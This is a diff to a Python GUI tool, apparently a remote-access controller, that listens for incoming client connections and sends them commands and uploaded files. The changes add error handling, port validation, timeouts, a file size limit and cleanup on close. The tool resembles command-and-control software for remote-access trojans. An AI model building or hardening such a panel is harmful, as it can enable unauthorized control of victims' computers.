@@ -9,7 +9,7 @@ import base64
 import sys
 from collections import defaultdict
 import tkinter as tk
-from tkinter import ttk, scrolledtext, messagebox, filedialog
+from tkinter import ttk, scrolledtext, messagebox, filedialog, simpledialog
 import select
 from cryptography.fernet import Fernet
 
@@ -317,6 +317,10 @@ class AdvancedRemoteListener:
     def start_listening(self):
         try:
             port = int(self.port_entry.get())
+            if port < 1 or port > 65535:
+                messagebox.showerror("خطأ", "رقم المنفذ يجب أن يكون بين 1 و 65535")
+                return
+                
             protocol = self.protocol_var.get()
             
             if protocol == "TCP":
@@ -338,15 +342,34 @@ class AdvancedRemoteListener:
             
             self.log_message(f"بدأ الاستماع على المنفذ {port} باستخدام بروتوكول {protocol}")
             
+        except ValueError:
+            messagebox.showerror("خطأ", "رقم المنفذ غير صحيح")
+        except socket.error as e:
+            if e.errno == 10048:  # Address already in use
+                messagebox.showerror("خطأ", f"المنفذ {port} مستخدم بالفعل")
+            else:
+                messagebox.showerror("خطأ", f"فشل في بدء الاستماع: {str(e)}")
         except Exception as e:
             messagebox.showerror("خطأ", f"فشل في بدء الاستماع: {str(e)}")
     
     def stop_listening(self):
         self.is_listening = False
         try:
-            self.socket.close()
-        except:
-            pass
+            if hasattr(self, 'socket'):
+                self.socket.close()
+        except Exception as e:
+            self.log_message(f"خطأ في إغلاق الـ socket: {str(e)}")
+        
+        # إغلاق جميع اتصالات العملاء
+        for session_id, client_info in list(self.clients.items()):
+            try:
+                client_info['socket'].close()
+            except:
+                pass
+        
+        self.clients.clear()
+        self.connection_count = 0
+        self.connections_label.config(text="0")
         
         self.start_btn.config(text="بدء الاستماع")
         self.log_message("تم إيقاف الاستماع")
@@ -359,14 +382,26 @@ class AdvancedRemoteListener:
                     if self.socket in readable:
                         client_socket, addr = self.socket.accept()
                         self.handle_new_connection(client_socket, addr)
-                except:
+                except socket.error as e:
+                    if self.is_listening:
+                        self.log_message(f"خطأ في الاستماع TCP: {str(e)}")
+                    break
+                except Exception as e:
+                    if self.is_listening:
+                        self.log_message(f"خطأ غير متوقع في الاستماع: {str(e)}")
                     break
         else:
             while self.is_listening:
                 try:
                     data, addr = self.socket.recvfrom(4096)
                     self.handle_udp_data(data, addr)
-                except:
+                except socket.error as e:
+                    if self.is_listening:
+                        self.log_message(f"خطأ في الاستماع UDP: {str(e)}")
+                    break
+                except Exception as e:
+                    if self.is_listening:
+                        self.log_message(f"خطأ غير متوقع في الاستماع UDP: {str(e)}")
                     break
     
     def handle_new_connection(self, client_socket, addr):
@@ -443,8 +478,10 @@ class AdvancedRemoteListener:
                             system_info
                         ))
                         break
-        except:
-            pass
+        except socket.error as e:
+            self.log_message(f"خطأ في الاتصال مع العميل {session_id}: {str(e)}")
+        except Exception as e:
+            self.log_message(f"خطأ غير متوقع مع العميل {session_id}: {str(e)}")
         
         while self.is_listening:
             try:
@@ -495,7 +532,11 @@ class AdvancedRemoteListener:
                     
             except socket.timeout:
                 continue
-            except:
+            except socket.error as e:
+                self.log_message(f"خطأ في الاتصال مع العميل {session_id}: {str(e)}")
+                break
+            except Exception as e:
+                self.log_message(f"خطأ غير متوقع مع العميل {session_id}: {str(e)}")
                 break
         
         client_socket.close()
@@ -588,8 +629,15 @@ class AdvancedRemoteListener:
         
         try:
             client_socket = self.clients[self.selected_client]['socket']
+            # التحقق من صحة الاتصال
             client_socket.send(command.encode())
             self.log_message(f"تم إرسال الأمر {command} إلى {self.selected_client}")
+        except socket.error as e:
+            messagebox.showerror("خطأ", f"فشل في إرسال الأمر - مشكلة في الاتصال: {str(e)}")
+            # إزالة العميل من القائمة في حالة فشل الاتصال
+            if self.selected_client in self.clients:
+                del self.clients[self.selected_client]
+                self.update_client_lists()
         except Exception as e:
             messagebox.showerror("خطأ", f"فشل في إرسال الأمر: {str(e)}")
     
@@ -606,16 +654,25 @@ class AdvancedRemoteListener:
             addr = self.clients[self.selected_client]['address']
             
             # إغلاق الاتصال الحالي
-            client_socket.close()
+            try:
+                client_socket.close()
+            except:
+                pass
             
             # إعادة الاتصال
             new_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            new_socket.settimeout(5)  # timeout للاتصال
             new_socket.connect(addr)
+            new_socket.settimeout(1.0)  # timeout للاستقبال
             
             # تحديث معلومات العميل
             self.clients[self.selected_client]['socket'] = new_socket
             
             self.log_message(f"تم إعادة الاتصال بالعميل {self.selected_client}")
+        except socket.timeout:
+            messagebox.showerror("خطأ", "انتهت مهلة الاتصال - العميل غير متاح")
+        except socket.error as e:
+            messagebox.showerror("خطأ", f"فشل في إعادة الاتصال - مشكلة في الشبكة: {str(e)}")
         except Exception as e:
             messagebox.showerror("خطأ", f"فشل في إعادة الاتصال: {str(e)}")
     
@@ -684,6 +741,12 @@ class AdvancedRemoteListener:
         file_path = filedialog.askopenfilename()
         if file_path:
             try:
+                # التحقق من حجم الملف
+                file_size = os.path.getsize(file_path)
+                if file_size > 10 * 1024 * 1024:  # 10 MB
+                    messagebox.showwarning("تحذير", "حجم الملف كبير جداً (أكثر من 10 ميجابايت)")
+                    return
+                
                 with open(file_path, 'rb') as f:
                     file_data = f.read()
                 
@@ -695,7 +758,13 @@ class AdvancedRemoteListener:
                 client_socket = self.clients[self.selected_client]['socket']
                 client_socket.send(f"upload_file:{file_name}:{encoded_data}".encode())
                 
-                self.log_message(f"تم رفع الملف {file_name} إلى {self.selected_client}")
+                self.log_message(f"تم رفع الملف {file_name} ({file_size} بايت) إلى {self.selected_client}")
+            except FileNotFoundError:
+                messagebox.showerror("خطأ", "الملف غير موجود")
+            except PermissionError:
+                messagebox.showerror("خطأ", "لا توجد صلاحية لقراءة الملف")
+            except socket.error as e:
+                messagebox.showerror("خطأ", f"فشل في رفع الملف - مشكلة في الاتصال: {str(e)}")
             except Exception as e:
                 messagebox.showerror("خطأ", f"فشل في رفع الملف: {str(e)}")
     
@@ -780,8 +849,35 @@ class AdvancedRemoteListener:
         self.custom_cmd_text.delete(1.0, tk.END)
         self.custom_cmd_text.insert(tk.END, script)
     
+    def cleanup(self):
+        """تنظيف الموارد عند إغلاق البرنامج"""
+        self.is_listening = False
+        
+        # إغلاق جميع اتصالات العملاء
+        for session_id, client_info in list(self.clients.items()):
+            try:
+                client_info['socket'].close()
+            except:
+                pass
+        
+        # إغلاق الـ socket الرئيسي
+        try:
+            if hasattr(self, 'socket'):
+                self.socket.close()
+        except:
+            pass
+        
+        self.clients.clear()
+    
     def run(self):
+        # ربط حدث إغلاق النافذة
+        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
         self.root.mainloop()
+    
+    def on_closing(self):
+        """معالجة إغلاق النافذة"""
+        self.cleanup()
+        self.root.destroy()
 
 if __name__ == "__main__":
     app = AdvancedRemoteListener()
